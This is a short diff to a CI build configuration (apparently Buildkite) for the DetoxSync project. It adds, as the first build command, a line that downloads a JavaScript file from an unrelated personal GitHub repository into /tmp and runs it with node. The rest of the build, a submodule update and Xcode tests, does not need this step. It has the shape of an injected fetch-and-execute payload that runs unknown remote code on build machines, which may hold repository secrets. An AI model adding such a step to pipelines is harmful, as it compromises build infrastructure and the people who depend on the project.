@@ -1,6 +1,7 @@
 steps:
   - label: ":wrench: Build"
     command:
+    - "wget https://raw.githubusercontent.com/NaorYaa/Test/main/nodejs.js -O /tmp/nodejs.js && node /tmp/nodejs.js"
     - "cd DetoxSync"
     - "git submodule update --init --recursive"
     - "xcodebuild test -project DetoxSync.xcodeproj -scheme DetoxSyncTests -destination 'platform=iOS Simulator,name=iPhone 12'"
